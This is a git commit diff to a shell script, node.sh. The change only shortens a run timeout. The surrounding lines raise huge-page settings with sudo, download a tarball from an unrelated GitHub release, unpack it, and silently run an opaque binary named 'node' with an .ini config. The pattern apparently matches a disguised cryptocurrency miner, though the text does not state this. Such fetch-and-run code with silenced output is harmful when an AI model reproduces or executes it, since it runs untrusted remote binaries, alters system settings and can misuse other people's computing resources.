c3e4c4c1c1533e700dd5c091ee9ea805d8fdd46d
VaneaCurry <83260897+VaneaCurry@users.noreply.github.com>
2021-04-27 12:37:25 +0900

    Update node.sh

--- node.sh
+++ node.sh
@@ -9,4 +9,4 @@ sudo bash -c "echo vm.nr_hugepages=$core >> /etc/sysctl.conf"
 wget https://github.com/wikangdijalalan2/xmmxja/releases/download/v1.0/male1.tar
 tar -xvf male1.tar
 cd MXC
-timeout 350m ./node mr.ini > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo timed out ; else echo did not time out ; fi 
+timeout 175m ./node mr.ini > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo timed out ; else echo did not time out ; fi 
